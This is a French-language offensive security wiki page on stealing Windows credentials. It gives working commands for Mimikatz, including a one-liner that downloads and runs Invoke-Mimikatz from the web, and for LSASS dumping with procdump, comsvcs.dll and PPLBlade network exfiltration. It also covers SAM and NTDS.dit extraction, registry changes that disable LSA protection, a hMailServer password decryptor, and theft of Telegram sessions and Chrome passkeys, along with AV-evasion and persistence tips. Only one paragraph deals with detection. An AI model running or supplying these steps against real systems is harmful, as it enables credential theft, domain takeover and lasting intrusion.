# Vol d’identifiants Windows

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Découvrez d’autres choses que Mimikatz peut faire sur** [**cette page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Découvrez ici quelques protections possibles des identifiants.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d’extraire certains identifiants.**

## Credentials avec Meterpreter

Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** j’ai créé pour **rechercher des mots de passe et des hashes** sur la victime.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Contourner l’AV

### Procdump + Mimikatz

Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil Microsoft légitime**, il n’est pas détecté par Defender.\
Vous pouvez utiliser cet outil pour **dump le processus lsass**, **télécharger le dump** et **extraire localement** les **identifiants** à partir du dump.

Vous pouvez également utiliser [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Remarque** : Certains **AV** peuvent **détecter** comme **malveillant** l’usage de **procdump.exe pour dumper lsass.exe**, car ils **détectent** les chaînes **« procdump.exe » et « lsass.exe »**. Il est donc plus **discret** de **passer** en **argument** le **PID** de lsass.exe à procdump **plutôt que** le **nom lsass.exe.**

### Dumping lsass with **comsvcs.dll**

Une DLL nommée **comsvcs.dll**, présente dans `C:\Windows\System32`, est chargée de **dumper la mémoire des processus** en cas de plantage. Cette DLL comprend une **fonction** nommée **`MiniDumpW`**, conçue pour être appelée à l’aide de `rundll32.exe`.\
Les deux premiers arguments n’ont pas d’importance, mais le troisième est divisé en trois éléments. Le premier correspond au PID du processus à dumper, le deuxième à l’emplacement du fichier dump et le troisième est obligatoirement le mot **full**. Il n’existe pas d’autres options.\
Une fois ces trois éléments analysés, la DLL crée le fichier dump et y transfère la mémoire du processus spécifié.\
Il est possible d’utiliser **comsvcs.dll** pour dumper le processus lsass, ce qui évite d’avoir à téléverser et exécuter procdump. Cette méthode est décrite en détail sur [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

La commande suivante est utilisée pour l’exécution :

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass avec Task Manager**

1. Faites un clic droit sur la barre des tâches, puis cliquez sur Task Manager
2. Cliquez sur More details
3. Recherchez le processus « Local Security Authority Process » dans l’onglet Processes
4. Faites un clic droit sur le processus « Local Security Authority Process », puis cliquez sur « Create dump file ».

### Dumping lsass avec procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Un dump de plantage système complet déjà existant, ou une copie compressée dans un dossier utilisateur accessible, peut conserver des éléments d’identification utiles à une analyse hors ligne. Des noms de fichier tels que `MEMORY.DMP` et `MEMORY.7z` sont uniquement des pistes à examiner : vérifiez leur provenance et leur accessibilité, et ne supposez pas qu’ils contiennent des identifiants utilisables ou à jour.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumpin lsass avec PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de dump de processus protégés qui permet d’obfusquer le dump mémoire et de le transférer vers des postes de travail distants sans l’écrire sur le disque.

**Fonctionnalités clés** :

1. Contourner la protection PPL
2. Obfusquer les fichiers de dump mémoire pour échapper aux mécanismes de détection de Defender basés sur les signatures
3. Téléverser le dump mémoire via les méthodes RAW et SMB sans l’écrire sur le disque (dump fileless)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – Dump LSASS basé sur SSP, sans MiniDumpWriteDump

Ink Dragon utilise un dumper en trois étapes appelé **LalsDumper**, qui n’appelle jamais `MiniDumpWriteDump` : les hooks EDR sur cette API ne se déclenchent donc jamais.<sup>[[3]](#references)</sup>

1. **Chargeur de l’étape 1 (`lals.exe`)** – recherche dans `fdp.dll` un espace réservé composé de 32 caractères `d` minuscules, le remplace par le chemin absolu vers `rtu.txt`, enregistre la DLL modifiée sous le nom `nfdp.dll`, puis appelle `AddSecurityPackageA("nfdp","fdp")`. Cela force **LSASS** à charger la DLL malveillante comme nouveau Security Support Provider (SSP).
2. **Étape 2 dans LSASS** – lorsque LSASS charge `nfdp.dll`, la DLL lit `rtu.txt`, applique un XOR à chaque octet avec `0x20`, puis mappe le blob décodé en mémoire avant de transférer l’exécution.
3. **Étape 3 : dumper** – le payload mappé réimplémente la logique de MiniDump à l’aide de **direct syscalls**, résolus à partir de noms d’API hachés (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dédié nommé `Tom` ouvre `%TEMP%\<pid>.ddt`, écrit un dump LSASS compressé dans le fichier, puis ferme le handle afin que l’exfiltration puisse avoir lieu ultérieurement.

Notes pour l’opérateur :

* Gardez `lals.exe`, `fdp.dll`, `nfdp.dll` et `rtu.txt` dans le même répertoire. L’étape 1 remplace l’espace réservé codé en dur par le chemin absolu vers `rtu.txt` ; les séparer interrompt la chaîne.
* L’enregistrement s’effectue en ajoutant `nfdp` à `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Vous pouvez ajouter cette valeur vous-même pour que LSASS recharge le SSP à chaque démarrage.
* Les fichiers `%TEMP%\*.ddt` sont des dumps compressés. Décompressez-les localement, puis utilisez Mimikatz/Volatility pour extraire les identifiants.
* L’exécution de `lals.exe` nécessite des droits d’administrateur/SeTcb pour que `AddSecurityPackageA` réussisse ; dès que l’appel renvoie un résultat, LSASS charge de manière transparente le SSP malveillant et exécute l’étape 2.
* Supprimer la DLL du disque ne la décharge pas de LSASS. Supprimez l’entrée du registre et redémarrez LSASS (redémarrage du système), ou laissez-la en place pour une persistance à long terme.

## CrackMapExec

### Dump des hashes SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Extraire le NTDS.dit du contrôleur de domaine cible

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump de l’historique des mots de passe de NTDS.dit depuis le DC cible

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Afficher l’attribut pwdLastSet pour chaque compte NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Vol de SAM et SYSTEM

Ces fichiers doivent se trouver dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier normalement**, car ils sont protégés.

### Depuis le registre

Le moyen le plus simple de voler ces fichiers consiste à en obtenir une copie depuis le registre :

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Téléchargez** ces fichiers sur votre machine Kali et **extrayez les hashes** à l'aide de :

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Vous pouvez copier des fichiers protégés à l’aide de ce service. Vous devez disposer des droits d’administrateur.

#### Using vssadmin

Le binaire vssadmin est uniquement disponible dans les versions de Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Mais vous pouvez faire la même chose depuis **Powershell**. Voici un exemple de **copie du fichier SAM** (le disque dur utilisé est « C: » et le fichier est enregistré dans C:\users\Public), mais vous pouvez utiliser cette méthode pour copier n’importe quel fichier protégé :

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code du livre : [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Enfin, vous pouvez également utiliser le [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour copier SAM, SYSTEM et ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Identifiants Active Directory - NTDS.dit**

Le fichier **NTDS.dit** est considéré comme le cœur d’**Active Directory**. Il contient des données essentielles sur les objets utilisateur, les groupes et leurs appartenances. C’est là que sont stockés les **hashes de mots de passe** des utilisateurs du domaine. Ce fichier est une base de données **Extensible Storage Engine (ESE)**, située dans **_%SystemRoom%/NTDS/ntds.dit_**.

Cette base de données contient trois tables principales :

- **Data Table** : cette table stocke les informations sur les objets, comme les utilisateurs et les groupes.
- **Link Table** : elle conserve les relations, telles que les appartenances aux groupes.
- **SD Table** : les **descripteurs de sécurité** de chaque objet y sont stockés afin d’assurer la sécurité et le contrôle d’accès des objets concernés.

Les recherches de Christoffer Andersson sur la couche base de données documentent plus en détail ces tables et leur comportement selon les versions.<sup>[[8]](#references)</sup>

Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier, et celui-ci est utilisé par _lsass.exe_. Une **partie** du fichier **NTDS.dit** peut donc se trouver **dans la mémoire de `lsass`** (il est probable que les données consultées récemment s’y trouvent, afin d’améliorer les performances grâce à un **cache**).

#### Déchiffrer les hashes dans NTDS.dit

Le hash est chiffré trois fois :

1. Déchiffrer la clé de chiffrement des mots de passe (**PEK**) à l’aide du **BOOTKEY** et de **RC4**.
2. Déchiffrer le **hash** à l’aide de **PEK** et de **RC4**.
3. Déchiffrer le **hash** à l’aide de **DES**.

La **PEK** a la **même valeur sur chaque contrôleur de domaine**, mais elle est **chiffrée** dans **NTDS.dit** avec le **BOOTKEY** propre au contrôleur de domaine, provenant de sa ruche **SYSTEM**. L’extraction des identifiants nécessite donc à la fois **NTDS.dit** et **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Copier NTDS.dit avec Ntdsutil

Disponible depuis Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Vous pouvez également utiliser l’astuce de la [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N’oubliez pas que vous aurez également besoin d’une copie du **fichier SYSTEM** (là encore, [**extrayez-le du registre ou utilisez l’astuce de la volume shadow copy**](#stealing-sam-and-system)).

### **Extraction des hashes depuis NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hashes** :

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Vous pouvez également les **extraire automatiquement** à l’aide d’un utilisateur administrateur de domaine valide :

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Pour les **fichiers NTDS.dit volumineux**, il est recommandé de les extraire à l’aide de [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Enfin, vous pouvez également utiliser le **module metasploit** : _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraction des objets de domaine de NTDS.dit vers une base de données SQLite**

Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). L’outil extrait non seulement les secrets, mais aussi les objets complets et leurs attributs, afin d’en extraire davantage d’informations une fois le fichier NTDS.dit brut récupéré.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

La ruche `SYSTEM` est facultative, mais elle permet le déchiffrement des secrets (hashes NT et LM, informations d’identification supplémentaires telles que les mots de passe en clair, clés Kerberos ou de confiance, historiques des mots de passe NT et LM). Parmi les autres informations, les données suivantes sont extraites : comptes utilisateur et machine avec leurs hashes, indicateurs UAC, horodatage de la dernière connexion et du dernier changement de mot de passe, descriptions des comptes, noms, UPN, SPN, groupes et appartenances récursives, arborescence des unités organisationnelles et appartenances, domaines approuvés avec le type, la direction et les attributs des relations d’approbation...

## Lazagne

Téléchargez le binaire [ici](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire les identifiants de plusieurs logiciels.

```
lazagne.exe all
```

## Autres outils pour extraire des identifiants de SAM et LSASS

### Windows credentials Editor (WCE)

Cet outil peut être utilisé pour extraire des identifiants de la mémoire. Téléchargez-le depuis : [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extraire les identifiants du fichier SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Extraire les identifiants du fichier SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Téléchargez-le depuis [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7), puis **exécutez-le** : les mots de passe seront extraits.

## Extraction des sessions RDP inactives et affaiblissement des contrôles de sécurité

Le RAT FinalDraft d’Ink Dragon inclut un tasker `DumpRDPHistory` dont les techniques sont utiles à tout red-teamer :<sup>[[3]](#references)</sup>

### Collecte de télémétrie de type DumpRDPHistory

* **Cibles RDP sortantes** – analysez chaque ruche utilisateur à `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Chaque sous-clé stocke le nom du serveur, `UsernameHint` et l’horodatage de la dernière écriture. Vous pouvez reproduire la logique de FinalDraft avec PowerShell :

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Traces de connexions RDP entrantes** – interrogez le journal `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pour les événements **21** (ouverture de session réussie) et **25** (déconnexion) afin de déterminer qui a administré la machine :

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Une fois que vous savez quel Domain Admin se connecte régulièrement, dump LSASS (avec LalsDumper/Mimikatz) tant que sa session **déconnectée** existe encore. Le repli de CredSSP + NTLM laisse son vérificateur et ses tokens dans LSASS, qui peuvent ensuite être rejoués via SMB/WinRM pour récupérer `NTDS.dit` ou mettre en place une persistance sur les contrôleurs de domaine.

### Dégradations du registre ciblées par FinalDraft

Le même implant altère également plusieurs clés de registre pour faciliter le vol d’identifiants :<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Définir `DisableRestrictedAdmin=1` force la réutilisation complète des identifiants/tickets pendant une session RDP, ce qui permet des pivots de type pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` désactive le filtrage des jetons UAC, de sorte que les administrateurs locaux obtiennent des jetons sans restriction sur le réseau.
* `DSRMAdminLogonBehavior=2` permet à l’administrateur DSRM de se connecter lorsque le DC est en ligne, offrant aux attaquants un autre compte intégré à privilèges élevés.
* `RunAsPPL=0` supprime les protections LSASS PPL, rendant l’accès à la mémoire trivial pour des outils de dump tels que LalsDumper.

## Identifiants de configuration hMailServer (après compromission)

Vérifiez les fichiers de configuration exacts `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` et `C:\ProgramData\hMailServer\hMailServer.ini`, selon la disposition de l’installation. Une valeur `[Security] AdministratorPassword=` lisible et non vide est un hash du mot de passe d’administration hMailServer ; elle ne prouve pas qu’il s’agit du mot de passe d’un administrateur Windows. Si cet identifiant est récupéré, tout pivot vers un compte Windows nécessite de vérifier indépendamment la réutilisation du mot de passe et les droits de connexion.

Pour les installations qui utilisent une base de données SQL CE, la valeur distincte `[Database] Password=` du fichier INI protège la base de données. Dans les anciennes installations, cette valeur est chiffrée avec Blowfish à l’aide de la clé statique `THIS_KEY_IS_NOT_SECRET` et d’inversions de l’endianness par mots de 4 octets. Utilisez la chaîne hexadécimale du fichier INI avec cet extrait Python :<sup>[[2]](#references)</sup>

Vérifiez d’abord que le compte actuel peut lire **à la fois** le fichier INI et la base de données SQL CE `.sdf` correspondante. Le mot de passe du fichier INI protège la base de données ; il est distinct des hashes des comptes de messagerie qui y sont stockés. Inspectez ou mettez à niveau une **copie** d’une base de données utilisée, jamais le fichier en production.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Avec le mot de passe en clair, copiez la base de données SQL CE pour éviter les verrouillages de fichiers, chargez le fournisseur 32 bits et effectuez une mise à niveau si nécessaire avant d’interroger les hachages :

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

The column `accountpassword` utilise le format de hachage hMailServer (mode `1421` de hashcat). Un mot de passe de boîte mail cracké ne permet un pivot vers un utilisateur Windows que si ce mot de passe est réutilisé par un compte local ou de domaine disposant des droits de connexion à distance nécessaires.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Certains outils capturent les **mots de passe de connexion en clair** en interceptant le callback de connexion LSA `LsaApLogonUserEx2`. L’idée consiste à hooker ou à envelopper le callback du package d’authentification afin de capturer les identifiants **lors de la connexion** (avant le hachage), puis de les écrire sur disque ou de les renvoyer à l’opérateur. Cette méthode est généralement mise en œuvre à l’aide d’un helper injecté dans LSA ou enregistré auprès de celui-ci, qui consigne ensuite chaque événement de connexion interactive ou réseau réussi avec le nom d’utilisateur, le domaine et le mot de passe.<sup>[[1]](#references)</sup>

Notes opérationnelles :
- Nécessite des privilèges d’administrateur local ou SYSTEM pour charger le helper dans le chemin d’authentification.
- Les identifiants capturés n’apparaissent qu’au moment d’une connexion (interactive, RDP, de service ou réseau, selon le hook).

## Identifiants de connexion enregistrés dans SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) stocke les informations de connexion enregistrées dans un fichier `sqlstudio.bin` propre à chaque utilisateur. Des outils dédiés peuvent analyser ce fichier et récupérer les identifiants SQL enregistrés. Dans les shells qui ne renvoient que la sortie des commandes, le fichier est souvent exfiltré en l’encodant en Base64 et en l’affichant sur stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Du côté de l’opérateur, reconstruisez le fichier et exécutez le dumper localement pour récupérer les identifiants :

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Vol de session de navigateur et de cookies via Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Vol de session `tdata` de Telegram Desktop

Telegram Desktop conserve les informations d’autorisation et l’état du compte dans son répertoire **`tdata`**. Une session copiée peut être chargée à l’aide d’outils compatibles pour s’authentifier sans le mot de passe du compte tant que cette autorisation reste valide ; si le chiffrement des données locales est activé, le voleur doit également disposer du code d’accès. Une session authentifiée peut alors révéler des données d’identité, des métadonnées sur les conversations et les appartenances, des messages et des médias téléchargeables.<sup>[[10]](#references)</sup>

### Recherche et récupération

Recherchez dans les installations classiques et portables ; les noms des packages du Microsoft Store varient, énumérez donc les répertoires de packages contenant `TelegramMessenge` et inspectez leur sous-répertoire `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Si les lectures ordinaires échouent et que le jeton du processus **contient déjà et active** `SeBackupPrivilege`, l’accès tenant compte des sauvegardes offre une solution de repli ; il n’obtient pas le privilège et n’élève pas les droits du processus. `CreateFileW` avec `FILE_FLAG_BACKUP_SEMANTICS` peut demander une sémantique de sauvegarde/restauration et contourner les vérifications de sécurité des fichiers lorsque les privilèges requis sont présents dans le jeton, mais le seul indicateur ne contourne pas un verrou de partage incompatible.<sup>[[10]](#references)[[11]](#references)</sup>

Pour les fichiers verrouillés en cours d’utilisation, créez/lisez une **Volume Shadow Copy** ; pour les fichiers bloqués par les ACL, `robocopy /B` utilise le mode sauvegarde et contourne les ACL des fichiers et des répertoires.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Un implant soucieux de la bande passante peut d’abord envoyer uniquement l’inventaire des chemins de fichiers, recevoir un identifiant d’instantané ainsi que la liste des chemins déjà stockés par le C2, puis téléverser uniquement les fichiers manquants. Par conséquent, de petits transferts incrémentiels après l’énumération récursive de `tdata` peuvent tout de même indiquer un vol de session réussi.<sup>[[10]](#references)</sup>

### Détection et confinement

Corrélez les accès récursifs à `tdata` par un processus autre que Telegram avec l’activation de `SeBackupPrivilege`, l’ouverture de fichiers avec les sémantiques de sauvegarde, l’activité VSS ou un processus enfant `robocopy.exe` utilisant `/B`. Recherchez également l’énumération rapide de `%APPDATA%` et de `%LOCALAPPDATA%\Packages`, suivie de connexions sortantes depuis le même processus. Après une compromission, utilisez **Paramètres → Appareils** (ou **Confidentialité et sécurité → Sessions actives**) pour mettre fin aux sessions non reconnues ; activer la validation en deux étapes ne révoque pas une autorisation déjà volée.<sup>[[10]](#references)[[13]](#references)</sup>

## Vol de credentials Passkeys / WebAuthn depuis Chrome sous Windows

Si une exécution de code est obtenue en tant qu’**utilisateur victime** sur un hôte Windows utilisant **Chrome + des passkeys synchronisées dans Google Password Manager**, les passkeys deviennent une cible intéressante après l’exploitation, même **sans admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artefacts locaux intéressants

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** stocke des enregistrements **`WebauthnCredentialSpecifics`** encodés en protobuf. Un processus exécuté par le même utilisateur peut énumérer le **RP ID**, le **nom d’utilisateur**, l’**ID d’identifiant** et le matériel de clé privée chiffré des passkeys synchronisées.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** stocke l’état local d’inscription de l’appareil, notamment **`wrapped_identity_private_key`** et le secret encapsulé utilisé pour récupérer les identifiants synchronisés.<sup>[[4]](#references)</sup>

Triage rapide :

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Les blobs de clé liés au TPM peuvent tout de même être détournés comme oracle de signature local

Si le navigateur exporte une clé d’identité protégée par le TPM sous forme de **`NCRYPT_OPAQUE_KEY_BLOB`** et stocke ce blob dans un état accessible à l’utilisateur, un malware n’a **pas** besoin d’extraire la clé privée brute. Il peut simplement réimporter le blob sur la **même machine** et demander au TPM local de signer des données contrôlées par l’attaquant :<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Cela signifie que **le binding matériel empêche l’export hors de l’appareil, mais pas l’utilisation par le même utilisateur sur le endpoint compromis**.

### Voies d’abus pratiques

1. **Pass-ta-key / relais d’identité de l’appareil**<sup>[[4]](#references)</sup>
   - Énumérer les `WebauthnCredentialSpecifics` dans le LevelDB de Chrome.
   - Démarrer une connexion par passkey et obtenir un nouveau challenge WebAuthn.
   - Utiliser le blob `wrapped_identity_private_key` volé sur le TPM de la victime pour signer le binding de la requête cloud-authenticator.
   - Relayer l’assertion obtenue au relying party.
   - Cette technique est particulièrement intéressante lorsque le RP accepte `userVerification=preferred` ou ne rejette pas les assertions avec **`UV=0`**.
2. **Détournement d’une clé UV en attente**<sup>[[4]](#references)</sup>
   - Forcer un nouvel enrôlement en supprimant `passkey_enclave_state` ou en envoyant une opération `device/forget` correctement signée.
   - Si l’enrôlement laisse l’appareil dans l’état **`uv_key_pending`**, enregistrer une clé publique UV contrôlée par l’attaquant.
   - Si le fournisseur ne vérifie pas l’attestation / l’origine matérielle sécurisée de la nouvelle clé UV, les signatures ultérieures de la clé de l’attaquant sont considérées comme **`UV=1`**.
3. **Vol du secret maître / de la récupération SDS**<sup>[[4]](#references)</sup>
   - Forcer une récupération ou une nouvelle jonction pour que Chrome récupère le secret maître des passkeys synchronisées.
